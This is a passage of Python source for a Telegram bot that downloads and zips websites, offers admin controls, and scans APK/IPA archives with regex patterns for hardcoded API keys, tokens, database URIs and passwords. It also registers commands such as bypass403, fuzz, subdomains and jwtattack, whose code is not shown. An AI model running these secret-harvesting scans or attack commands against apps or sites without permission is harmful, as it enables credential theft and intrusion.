            await msg.edit_text("🛑 Download cancelled")
            return
        try:
            async with db_lock:
                db2 = _load_db_sync()
            mp = db2["settings"]["max_pages"]
            ma = db2["settings"]["max_assets"]
            files, error, stats, size_mb = await asyncio.to_thread(
                download_website, url, full_site, use_js, mp, ma, sync_cb, resume_mode
            )
        except Exception as e:
            prog.cancel()
            err_name = type(e).__name__
            err_hint = {
                "ConnectionError":  "🌐 ဆာဗာနဲ့ ချိတ်ဆက်မရပါ",
                "TimeoutError":     "⏱️ Response timeout ဖြစ်သွားတယ်",
                "SSLError":         "🔒 SSL certificate ပြဿနာ",
                "TooManyRedirects": "🔄 Redirect loop ဖြစ်နေတယ်",
            }.get(err_name, f"⚠️ {err_name}")
            await msg.edit_text(
                f"❌ *Download မအောင်မြင်ဘူး*\n\n"
                f"{err_hint}\n\n"
                f"▸ ဆက်လုပ်ဖို့: `/resume {url}`\n"
                f"▸ JS site ဆိုရင်: `/jsdownload {url}`",
                parse_mode='Markdown'
            )
            async with db_lock:
                db3 = _load_db_sync()
                u3  = get_user(db3, uid)
                log_download(u3, url, 0, "error")
                _save_db_sync(db3)
            _cancel_flags.pop(uid, None)
            return

    prog.cancel()
    _cancel_flags.pop(uid, None)   # download finished — remove flag

    # Check if cancelled during download
    if cancel_event.is_set():
        await msg.edit_text("🛑 Download ကို cancel လုပ်ပြီးပါပြီ")
        return

    if error:
        await msg.edit_text(f"❌ {error}"); return

    is_split = len(files) > 1
    await msg.edit_text(
        f"📤 Upload နေပါတယ်...\n💾 {size_mb:.1f} MB"
        + (f" → {len(files)} parts" if is_split else ""),
        parse_mode='Markdown'
    )

    try:
        for i, fpath in enumerate(files):
            part_label = f" (Part {i+1}/{len(files)})" if is_split else ""
            cap = (
                f"{'✅' if i==len(files)-1 else '📦'} *Done{part_label}*\n"
                f"🔗 `{sanitize_log_url(url)}`\n"
                f"📄 {stats['pages']}p | 📦 {stats['assets']}a | 💾 {size_mb:.1f}MB"
            )
            # ── RetryAfter-aware upload (3 attempts) ──────
            for attempt in range(3):
                try:
                    with open(fpath, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=update.effective_chat.id,
                            document=f, filename=os.path.basename(fpath),
                            caption=cap, parse_mode='Markdown'
                        )
                    break  # success
                except RetryAfter as e:
                    wait = e.retry_after + 2
                    logger.warning("Upload RetryAfter: waiting %ds", wait)
                    await asyncio.sleep(wait)
                except Exception:
                    if attempt == 2:
                        raise
                    await asyncio.sleep(3)

            os.remove(fpath)
            await asyncio.sleep(1)

        join_hint = (
            "\n\n*Combine လုပ်နည်း:*\n```\ncat *.part*.zip > full.zip\n```"
        ) if is_split else ""

        await msg.edit_text(f"✅ ပြီးပါပြီ 🎉{join_hint}", parse_mode='Markdown')

        async with db_lock:
            db4 = _load_db_sync()
            u4  = get_user(db4, uid)
            log_download(u4, url, size_mb, "success")
            _save_db_sync(db4)

    except RetryAfter as e:
        await msg.edit_text(f"❌ Telegram flood limit — `{e.retry_after}s` နောက်မှ ထပ်ကြိုးစားပါ")
    except Exception as e:
        await msg.edit_text(f"❌ Upload error: {type(e).__name__}")


# ── Command wrappers ──────────────────────────────

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/stop — Cancel current running download"""
    uid = update.effective_user.id
    event = _cancel_flags.get(uid)
    if event and not event.is_set():
        event.set()
        await update.effective_message.reply_text(
            "🛑 *Download cancel လုပ်နေပါတယ်...*\n"
            "⚙️ လက်ရှိ page/asset ပြီးရင် ရပ်မယ်",
            parse_mode='Markdown'
        )
    else:
        await update.effective_message.reply_text(
            "ℹ️ Cancel လုပ်စရာ Download မရှိပါ\n"
            "`/download`, `/fullsite` စသည်ဖြင့် download ကနဦးစပါ",
            parse_mode='Markdown'
        )


async def cmd_download(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/download <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, False, False)

async def cmd_fullsite(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/fullsite <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, True, False)

async def cmd_jsdownload(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/jsdownload <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, False, True)

async def cmd_jsfullsite(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/jsfullsite <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, True, True)

async def cmd_resume(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/resume <url>`", parse_mode='Markdown')
    url   = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    state = load_resume(url)
    if not state["visited"] and not state["downloaded"]:
        await u.message.reply_text("⚠️ Resume state မတွေ့ပါ — `/download` ကနေ အသစ်ကနေ စပါ", parse_mode='Markdown')
        return
    await u.message.reply_text(
        f"♻️ Resume: `{len(state['visited'])}` pages, `{len(state['downloaded'])}` assets done",
        parse_mode='Markdown'
    )
    await enqueue_download(u, c, url, True, False, resume_mode=True)


# ══════════════════════════════════════════════════
# 👑  ADMIN COMMANDS
# ══════════════════════════════════════════════════

async def _send_admin_panel(target, db: dict):
    bot_on    = db["settings"]["bot_enabled"]
    today     = str(date.today())
    tu        = len(db["users"])
    tdl       = sum(u.get("total_downloads",0) for u in db["users"].values())
    banned_n  = sum(1 for u in db["users"].values() if u.get("banned"))
    today_dl  = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
    kb = [
        [
            InlineKeyboardButton("👥 Users",   callback_data="adm_users"),
            InlineKeyboardButton("📊 Stats",   callback_data="adm_stats"),
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data="adm_settings"),
            InlineKeyboardButton(
                "🔴 Bot OFF" if bot_on else "🟢 Bot ON",
                callback_data="adm_toggle_bot"
            ),
        ],
        [InlineKeyboardButton("📜 Downloads Log", callback_data="adm_log")]
    ]
    text = (
        f"👑 *Admin Panel v17.0*\n\n"
        f"👥 Users: `{tu}` | 🚫 Banned: `{banned_n}`\n"
        f"📦 Total: `{tdl}` | Today: `{today_dl}`\n"
        f"Bot: {'🟢 ON' if bot_on else '🔴 OFF'}\n"
        f"⚡ Concurrent: `{MAX_WORKERS}` | Limit: `{db['settings']['global_daily_limit']}`\n"
        f"🔒 SSRF/Traversal/RateLimit: ✅\n"
        f"JS: {'✅' if PUPPETEER_OK else '❌'}"
    )
    markup = InlineKeyboardMarkup(kb)
    try:
        if hasattr(target, 'edit_message_text'):
            await target.edit_message_text(text, reply_markup=markup, parse_mode='Markdown')
        else:
            await target.reply_text(text, reply_markup=markup, parse_mode='Markdown')
    except BadRequest: pass

@admin_only
async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
    await _send_admin_panel(update.message, db)

@admin_only
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/ban <id>`", parse_mode='Markdown')
    target = context.args[0]
    async with db_lock:
        db = _load_db_sync()
        if target in db["users"]:
            db["users"][target]["banned"] = True
            _save_db_sync(db)
            await update.effective_message.reply_text(f"🚫 `{target}` banned", parse_mode='Markdown')
        else:
            await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')

@admin_only
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/unban <id>`", parse_mode='Markdown')
    target = context.args[0]
    async with db_lock:
        db = _load_db_sync()
        if target in db["users"]:
            db["users"][target]["banned"] = False
            _save_db_sync(db)
            await update.effective_message.reply_text(f"✅ `{target}` unbanned", parse_mode='Markdown')
        else:
            await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')

@admin_only
async def cmd_setlimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        return await update.effective_message.reply_text(
            "Usage:\n`/setlimit global 5`\n`/setlimit <id> 3`\n`/setlimit <id> 0` = unlimited",
            parse_mode='Markdown'
        )
    target, num_str = context.args[0], context.args[1]
    try: num = int(num_str)
    except: return await update.effective_message.reply_text("❌ Number ထည့်ပါ")
    async with db_lock:
        db = _load_db_sync()
        if target == "global":
            db["settings"]["global_daily_limit"] = num
            _save_db_sync(db)
            await update.effective_message.reply_text(f"✅ Global → `{num}`", parse_mode='Markdown')
        elif target in db["users"]:
            db["users"][target]["daily_limit"] = None if num==0 else num
            _save_db_sync(db)
            await update.effective_message.reply_text(f"✅ `{target}` → `{num}`", parse_mode='Markdown')
        else:
            await update.effective_message.reply_text(f"❌ မတွေ့ပါ", parse_mode='Markdown')

@admin_only
async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/userinfo <id>`", parse_mode='Markdown')
    target = context.args[0]
    async with db_lock:
        db = _load_db_sync()
    if target not in db["users"]:
        return await update.effective_message.reply_text(f"❌ `{target}` မတွေ့ပါ", parse_mode='Markdown')
    u   = db["users"][target]
    lim = u.get("daily_limit") or db["settings"]["global_daily_limit"]
    recent = "\n".join(
        f"  {'✅' if d['status']=='success' else '❌'} `{d['url'][:40]}` {d['time']}"
        for d in reversed(u.get("downloads",[])[-5:])
    ) or "  (none)"
    await update.effective_message.reply_text(
        f"👤 *{u['name']}* (`{target}`)\n"
        f"🚫 Banned: {'Yes' if u['banned'] else 'No'}\n"
        f"📅 Limit: `{lim}` | Today: `{u['count_today']}`\n"
        f"📦 Total: `{u['total_downloads']}`\n\nRecent:\n{recent}",
        parse_mode='Markdown'
    )

@admin_only
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/broadcast <msg>`", parse_mode='Markdown')
    text = ' '.join(context.args)
    async with db_lock:
        db = _load_db_sync()
    sent = failed = skipped = 0
    status_msg = await update.effective_message.reply_text("📢 Broadcasting... 0 sent")
    for idx, uid_str in enumerate(db["users"]):
        try:
            await context.bot.send_message(int(uid_str), f"📢 *Admin*\n\n{text}", parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.05)          # 20 msgs/sec ကို မကျော်ဖို့
        except RetryAfter as e:
            wait = e.retry_after + 2
            logger.warning("Broadcast RetryAfter: sleeping %ds", wait)
            await asyncio.sleep(wait)
            try:                               # retry once after flood wait
                await context.bot.send_message(int(uid_str), f"📢 *Admin*\n\n{text}", parse_mode='Markdown')
                sent += 1
            except Exception:
                failed += 1
        except Exception:
            failed += 1
        if (idx + 1) % 10 == 0:              # progress every 10 users
            try:
                await status_msg.edit_text(f"📢 Broadcasting... `{sent}` sent | `{failed}` failed")
            except Exception:
                pass
    await status_msg.edit_text(f"✅ Broadcast ပြီးပါပြီ\n✉️ Sent: `{sent}` | ❌ Failed: `{failed}`", parse_mode='Markdown')

@admin_only
async def cmd_allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
    if not db["users"]: return await update.effective_message.reply_text("Empty")
    lines = ["👥 *Users*\n"]
    for uid, u in list(db["users"].items())[:30]:
        icon = "🚫" if u["banned"] else "✅"
        lines.append(f"{icon} `{uid}` — {u['name']} | {u['total_downloads']} DL")
    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')

@admin_only
async def cmd_setpages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/setpages 50`")
    async with db_lock:
        db = _load_db_sync()
        db["settings"]["max_pages"] = int(context.args[0])
        _save_db_sync(db)
    await update.effective_message.reply_text(f"✅ Max pages → `{context.args[0]}`", parse_mode='Markdown')

@admin_only
async def cmd_setassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.effective_message.reply_text("Usage: `/setassets 500`")
    async with db_lock:
        db = _load_db_sync()
        db["settings"]["max_assets"] = int(context.args[0])
        _save_db_sync(db)
    await update.effective_message.reply_text(f"✅ Max assets → `{context.args[0]}`", parse_mode='Markdown')



# ══════════════════════════════════════════════════
# 📱  APP / APK / IPA / ZIP ANALYZER
# ══════════════════════════════════════════════════

# Supported file types
_APP_EXTS = {
    '.apk':  'Android APK',
    '.xapk': 'Android XAPK',
    '.aab':  'Android App Bundle',
    '.ipa':  'iOS IPA',
    '.jar':  'Java JAR',
    '.war':  'Java WAR',
    '.zip':  'ZIP Archive',
    '.aar':  'Android Library',
}

# ── Regex patterns for API/URL/Key extraction ────
_APP_URL_PATTERNS = [
    # Full URLs
    re.compile(r'https?://[^\s\'"<>{}\[\]\\|^`]{8,200}'),
    # API paths
    re.compile(r'[\'"/]((?:api|rest|graphql|v\d+)/[^\s\'"<>]{3,120})[\'"/]'),
    # Base URLs
    re.compile(r'(?:BASE_URL|baseUrl|base_url|API_URL|apiUrl|HOST|ENDPOINT)\s*[=:]\s*[\'"]([^\'"]{8,150})[\'"]', re.I),
    # WebSocket
    re.compile(r'wss?://[^\s\'"<>{}\[\]\\]{8,150}'),
]

_APP_SECRET_PATTERNS = {
    'API Key':        re.compile(r'(?:api[_-]?key|apikey)\s*[=:]\s*[\'"]([A-Za-z0-9_\-]{16,80})[\'"]', re.I),
    'Secret Key':     re.compile(r'(?:secret[_-]?key|client_secret)\s*[=:]\s*[\'"]([A-Za-z0-9_\-]{16,80})[\'"]', re.I),
    'Bearer Token':   re.compile(r'[Bb]earer\s+([A-Za-z0-9\-_\.]{20,200})'),
    'AWS Key':        re.compile(r'AKIA[0-9A-Z]{16}'),
    'AWS Secret':     re.compile(r'(?:aws_secret|AWS_SECRET)[^\'"]{0,10}[\'"]([A-Za-z0-9/+=]{40})[\'"]', re.I),
    'Google API':     re.compile(r'AIza[0-9A-Za-z\-_]{35}'),
    'Firebase URL':   re.compile(r'https://[a-z0-9\-]+\.firebaseio\.com'),
    'Firebase Key':   re.compile(r'[\'"]([A-Za-z0-9_\-]{39}):APA91b[A-Za-z0-9_\-]{134}[\'"]'),
    'Stripe Key':     re.compile(r'(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}'),
    'Twilio SID':     re.compile(r'AC[0-9a-fA-F]{32}'),
    'Private Key':    re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
    'JWT Token':      re.compile(r'eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}'),
    'MongoDB URI':    re.compile(r'mongodb(?:\+srv)?://[^\s\'"<>]{10,150}'),
    'MySQL URI':      re.compile(r'mysql://[^\s\'"<>]{10,150}'),
    'Postgres URI':   re.compile(r'postgres(?:ql)?://[^\s\'"<>]{10,150}'),
    'Hardcoded Pass': re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*[\'"]([^\'"]{6,60})[\'"]', re.I),
}

# ── File types to scan inside archive ───────────
_SCAN_EXTENSIONS = {
    '.smali', '.java', '.kt', '.xml', '.json', '.yaml', '.yml',
    '.properties', '.gradle', '.plist', '.js', '.ts', '.html',
    '.txt', '.cfg', '.conf', '.env', '.config', '.swift',
    '.m', '.h', '.cpp', '.py', '.rb', '.php', '.go', '.rs',
    '.dart', '.cs', '.strings', '.ini',
}

_BINARY_EXTS = {'.dex', '.so', '.dylib', '.dll', '.class'}

# Files/dirs to skip (build artifacts, noise)
_SKIP_DIRS = {
    'res/drawable', 'res/mipmap', 'res/raw', 'res/anim',
    '__MACOSX', 'META-INF', 'kotlin', 'okhttp3', 'retrofit2',
    'com/google/android', 'com/facebook', 'com/squareup',
    'io/fabric', 'com/crashlytics', 'com/amplitude',
}


def _should_skip(filepath: str) -> bool:
    fp = filepath.replace('\\', '/')
    return any(skip in fp for skip in _SKIP_DIRS)


def _scan_text_content(text: str, source_file: str) -> dict:
    """Text/source file တစ်ခုထဲမှာ URLs, APIs, secrets ရှာ"""
    urls    = set()
    secrets = {}

    for pat in _APP_URL_PATTERNS:
        for m in pat.findall(text):
            url = m.strip().rstrip('.,;\'"\\/)')
            if len(url) > 8 and not any(noise in url for noise in [
                'schemas.android', 'xmlns', 'w3.org', 'apache.org',
                'example.com', 'localhost', 'schema.org',
            ]):
                urls.add(url)

    for name, pat in _APP_SECRET_PATTERNS.items():
        matches = pat.findall(text)
        if matches:
            # Don't store full secrets — just flag existence
            secrets[name] = len(matches)

    return {"urls": list(urls), "secrets": secrets, "file": source_file}


def _extract_strings_from_binary(data: bytes) -> list:
    """Binary (DEX/SO) ထဲမှာ printable strings ရှာ"""
    strings = []
    current = []
    for byte in data:
        ch = chr(byte)
        if ch.isprintable() and byte not in (0,):
            current.append(ch)
        else:
            if len(current) >= 6:
                s = ''.join(current)
                # Only keep if looks like URL or API path
                if ('http' in s or '/api/' in s or '.com' in s
                        or '.json' in s or 'firebase' in s.lower()):
                    strings.append(s)
            current = []
    return strings[:500]  # cap


def _parse_android_manifest(xml_text: str) -> dict:
    """AndroidManifest.xml ထဲမှာ package, permissions, activities ရှာ"""
    info = {"package": "", "permissions": [], "activities": [],
            "services": [], "receivers": [], "meta_data": {}}
    try:
        # package name
        m = re.search(r'package=[\'"]([^\'"]+)[\'"]', xml_text)
        if m: info["package"] = m.group(1)

        # permissions
        for m in re.finditer(r'uses-permission[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["permissions"].append(m.group(1).replace('android.permission.', ''))

        # activities
        for m in re.finditer(r'activity[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["activities"].append(m.group(1))

        # services
        for m in re.finditer(r'service[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["services"].append(m.group(1))

        # meta-data (API keys often here)
        for m in re.finditer(r'meta-data[^>]+android:name=[\'"]([^\'"]+)[\'"][^>]+android:value=[\'"]([^\'"]+)[\'"]', xml_text):
            info["meta_data"][m.group(1)] = m.group(2)[:80]

    except Exception:
        pass
    return info


def _parse_ios_info_plist(plist_text: str) -> dict:
    """iOS Info.plist ထဲမှာ bundle ID, keys ရှာ"""
    info = {"bundle_id": "", "permissions": [], "url_schemes": [], "keys": {}}
    try:
        m = re.search(r'<key>CFBundleIdentifier</key>\s*<string>([^<]+)</string>', plist_text)
        if m: info["bundle_id"] = m.group(1)

        # URL Schemes
        for m in re.finditer(r'CFBundleURLSchemes.*?<string>([^<]+)</string>', plist_text, re.S):
            info["url_schemes"].append(m.group(1))

        # Privacy usage descriptions (permissions)
        for m in re.finditer(r'<key>(NS\w+UsageDescription)</key>\s*<string>([^<]{0,80})</string>', plist_text):
            info["permissions"].append(m.group(1))

        # API-related keys
        api_keys = ['GoogleService', 'Firebase', 'FacebookAppID', 'API', 'Key', 'Secret', 'Token']
        for m in re.finditer(r'<key>([^<]+)</key>\s*<string>([^<]{4,80})</string>', plist_text):
            k, v = m.group(1), m.group(2)
            if any(ak.lower() in k.lower() for ak in api_keys):
                info["keys"][k] = v[:60]

    except Exception:
        pass
    return info


def analyze_app_file(filepath: str, progress_cb=None) -> dict:
    """
    APK/IPA/ZIP/JAR ကို analyze လုပ်ပြီး:
    - API endpoints
    - Hardcoded secrets/keys
    - AndroidManifest / Info.plist info
    - Network URLs
    - Source file list
    ထုတ်ပေး
    """
    result = {
        "file_type":   "",
        "file_size_mb": 0,
        "app_info":    {},
        "urls":        [],
        "api_paths":   [],
        "secrets":     {},
        "source_files": [],
        "binary_urls": [],
        "stats":       {},
        "errors":      [],
    }

    try:
        ext      = os.path.splitext(filepath)[1].lower()
        fsize_mb = os.path.getsize(filepath) / 1024 / 1024
        result["file_type"]    = _APP_EXTS.get(ext, ext.upper())
        result["file_size_mb"] = round(fsize_mb, 2)

        if not zipfile.is_zipfile(filepath):
            result["errors"].append("Not a valid ZIP/APK/IPA file")
            return result

        all_urls    = set()
        all_secrets = {}   # {name: count}
        source_files = []

        with zipfile.ZipFile(filepath, 'r') as zf:
            names = zf.namelist()
            result["stats"]["total_files"] = len(names)
            if progress_cb:
                progress_cb(f"📂 Files: `{len(names)}`  Extracting...")

            text_count = 0
            for i, name in enumerate(names):
                if _should_skip(name):
                    continue

                _, fext = os.path.splitext(name.lower())

                # ── Text files: scan directly ──────────
                if fext in _SCAN_EXTENSIONS:
                    try:
                        data = zf.read(name)
                        text = data.decode('utf-8', errors='replace')
                        scan = _scan_text_content(text, name)

                        for url in scan["urls"]:
                            all_urls.add(url)
                        for sec_name, cnt in scan["secrets"].items():
                            all_secrets[sec_name] = all_secrets.get(sec_name, 0) + cnt

                        if scan["urls"] or scan["secrets"]:
                            source_files.append({
                                "file":    name,
                                "urls":    len(scan["urls"]),
                                "secrets": list(scan["secrets"].keys()),
                            })

                        # AndroidManifest.xml
                        if name == 'AndroidManifest.xml' and '<manifest' in text:
                            result["app_info"] = _parse_android_manifest(text)
                            result["app_info"]["platform"] = "Android"

                        # iOS Info.plist
                        if name.endswith('Info.plist') and 'CFBundle' in text:
                            result["app_info"] = _parse_ios_info_plist(text)
                            result["app_info"]["platform"] = "iOS"

                        text_count += 1
                    except Exception as e:
                        result["errors"].append(f"{name}: {e}")

                # ── Binary files: string extraction ────
                elif fext in _BINARY_EXTS and fsize_mb < 20:
                    try:
                        data = zf.read(name)
                        bin_strings = _extract_strings_from_binary(data)
                        for s in bin_strings:
                            all_urls.add(s)
                    except Exception:
                        pass

                if progress_cb and (i + 1) % 50 == 0:
                    progress_cb(
                        f"🔍 Scanning `{i+1}/{len(names)}`\n"
                        f"🌐 URLs: `{len(all_urls)}` | 🔑 Secrets: `{len(all_secrets)}`"
                    )

        # ── Categorize URLs ───────────────────────────
        api_paths = set()
        full_urls = set()
        ws_urls   = set()

        for u in all_urls:
            u = u.strip().rstrip('/.,;')
            if not u: continue
            if u.startswith('wss://') or u.startswith('ws://'):
                ws_urls.add(u)
            elif u.startswith('http'):
                full_urls.add(u)
                # Extract path as API path too
                try:
                    p = urlparse(u).path
                    if p and len(p) > 3 and any(k in p for k in [
                        '/api/', '/rest/', '/v1/', '/v2/', '/graphql', '/auth', '/user'
                    ]):
                        api_paths.add(p)
                except Exception:
                    pass
            elif u.startswith('/'):
                api_paths.add(u)

        result["urls"]         = sorted(full_urls)[:300]
        result["api_paths"]    = sorted(api_paths)[:200]
        result["ws_urls"]      = sorted(ws_urls)[:50]
        result["secrets"]      = all_secrets
        result["source_files"] = sorted(source_files,
                                         key=lambda x: x["urls"] + len(x["secrets"]) * 3,
                                         reverse=True)[:30]
        result["stats"].update({
            "text_files_scanned": text_count,
            "unique_urls":        len(full_urls),
            "api_paths":          len(api_paths),
            "ws_urls":            len(ws_urls),
            "secret_types":       len(all_secrets),
        })

    except Exception as e:
        result["errors"].append(str(e))

    return result



# ── Admin callbacks ───────────────────────────────

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("🚫 Admin only", show_alert=True); return
    if update.effective_chat.type != "private":
        await query.answer("Private chat only", show_alert=True); return

    async with db_lock:
        db = _load_db_sync()
    data = query.data

    if data == "adm_users":
        lines = ["👥 *Users*\n"]
        for uid, u in list(db["users"].items())[:20]:
            icon = "🚫" if u["banned"] else "✅"
            lines.append(f"{icon} `{uid}` — {u['name']} | {u['total_downloads']} DL")
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        try: await query.edit_message_text("\n".join(lines) or "Empty", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        except BadRequest: pass

    elif data == "adm_stats":
        today   = str(date.today())
        tdl     = sum(u.get("total_downloads",0) for u in db["users"].values())
        tdl_day = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
        top = sorted(db["users"].items(), key=lambda x: x[1].get("total_downloads",0), reverse=True)[:5]
        top_txt = "\n".join(f"  {i+1}. {u['name']} ({u['total_downloads']})" for i,(_,u) in enumerate(top)) or "None"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            f"📊 *Stats*\n\nTotal: `{tdl}` | Today: `{tdl_day}`\n\n🏆 Top:\n{top_txt}",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_settings":
        s  = db["settings"]
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            f"⚙️ *Settings*\n\n"
            f"Daily Limit: `{s['global_daily_limit']}` (`/setlimit global <n>`)\n"
            f"Max Pages: `{s['max_pages']}` (`/setpages <n>`)\n"
            f"Max Assets: `{s['max_assets']}` (`/setassets <n>`)\n"
            f"Bot: `{'ON' if s['bot_enabled'] else 'OFF'}`\n"
            f"Rate Limit: `{RATE_LIMIT_SEC}s` per request\n"
            f"Max Asset Size: `{MAX_ASSET_MB}MB`\n"
            f"Split: `{SPLIT_MB}MB`",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_toggle_bot":
        async with db_lock:
            db2 = _load_db_sync()
            db2["settings"]["bot_enabled"] = not db2["settings"]["bot_enabled"]
            _save_db_sync(db2)
            new_state = db2["settings"]["bot_enabled"]
        await query.answer(f"Bot is now {'🟢 ON' if new_state else '🔴 OFF'}", show_alert=True)
        async with db_lock:
            db3 = _load_db_sync()
        await _send_admin_panel(query, db3)

    elif data == "adm_log":
        all_logs = []
        for uid, u in db["users"].items():
            for d in u.get("downloads",[]): all_logs.append((u["name"], d))
        all_logs.sort(key=lambda x: x[1]["time"], reverse=True)
        lines = ["📜 *Recent 15*\n"]
        for name, d in all_logs[:15]:
            icon = "✅" if d["status"]=="success" else "❌"
            lines.append(f"{icon} *{name}* `{d['url'][:35]}` {d['time']}")
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            "\n".join(lines) if len(lines)>1 else "Empty",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_back":
        await _send_admin_panel(query, db)


# ══════════════════════════════════════════════════
# 🚀  MAIN
# ══════════════════════════════════════════════════

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("═"*55)
        print("❌  .env file ထဲ TOKEN ထည့်ဖို့ မမေ့ပါနဲ့")
        print()
        print("1. .env file create လုပ်ပါ:")
        print("   nano .env")
        print()
        print("2. ဒါတွေ ထည့်ပါ:")
        print("   BOT_TOKEN=your_token_here")
        print("   ADMIN_IDS=your_telegram_id")
        print("   SECRET_KEY=any_random_string_here")
        print()
        print("3. ID မသိရင်: @userinfobot → /start")
        print()
        print("JS Support:")
        print("  pkg install nodejs -y")
        print("  npm install puppeteer")
        print("═"*55)
        return


    # ── Build app with extended timeouts for Termux ───
    request = HTTPXRequest(
        connection_pool_size   = 8,
        connect_timeout        = 30.0,
        read_timeout           = 30.0,
        write_timeout          = 30.0,
        pool_timeout           = 30.0,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(request)
        .build()
    )

    # ── Init asyncio primitives (event loop must be running) ─
    global download_semaphore, db_lock, _dl_queue
    download_semaphore = asyncio.Semaphore(MAX_WORKERS)
    db_lock            = asyncio.Lock()
    _dl_queue          = asyncio.Queue(maxsize=QUEUE_MAX)

    # ── Web commands ─────────────────────────────────
    app.add_handler(CommandHandler("start",          cmd_start))
    app.add_handler(CommandHandler("help",           cmd_help))
    app.add_handler(CommandHandler("download",       cmd_download))
    app.add_handler(CommandHandler("fullsite",       cmd_fullsite))
    app.add_handler(CommandHandler("jsdownload",     cmd_jsdownload))
    app.add_handler(CommandHandler("jsfullsite",     cmd_jsfullsite))
    app.add_handler(CommandHandler("resume",         cmd_resume))
    app.add_handler(CommandHandler("stop",            cmd_stop))
    app.add_handler(CommandHandler("status",         cmd_status))
    app.add_handler(CommandHandler("history",        cmd_history))
    app.add_handler(CommandHandler("vuln",           cmd_vuln))
    app.add_handler(CommandHandler("api",            cmd_api))
    app.add_handler(CommandHandler("tech",           cmd_tech))
    app.add_handler(CommandHandler("extract",        cmd_extract))
    app.add_handler(CommandHandler("monitor",        cmd_monitor))
    app.add_handler(CommandHandler("bypass403",      cmd_bypass403))
    app.add_handler(CommandHandler("subdomains",     cmd_subdomains))
    app.add_handler(CommandHandler("fuzz",           cmd_fuzz))
    # ── New Feature Commands ──────────────────────────
    app.add_handler(CommandHandler("setforcejoin",   cmd_setforcejoin))
    app.add_handler(CommandHandler("appassets",      cmd_appassets))
    app.add_handler(CommandHandler("antibot",        cmd_antibot))
    app.add_handler(CommandHandler("smartfuzz",      cmd_smartfuzz))
    app.add_handler(CommandHandler("jwtattack",      cmd_jwtattack))
    app.add_handler(CommandHandler("sitekey",        cmd_sitekey))
    # ── Account commands ──────────────────────────────
    app.add_handler(CommandHandler("mystats",        cmd_mystats))
    # ── Admin commands ────────────────────────────────
    app.add_handler(CommandHandler("admin",          cmd_admin))
    app.add_handler(CommandHandler("proxy",          cmd_proxy))
    app.add_handler(CommandHandler("setproxy",       cmd_setproxy))
    app.add_handler(CommandHandler("ban",            cmd_ban))
    app.add_handler(CommandHandler("unban",          cmd_unban))
    app.add_handler(CommandHandler("setlimit",       cmd_setlimit))
    app.add_handler(CommandHandler("userinfo",       cmd_userinfo))
    app.add_handler(CommandHandler("broadcast",      cmd_broadcast))
    app.add_handler(CommandHandler("allusers",       cmd_allusers))
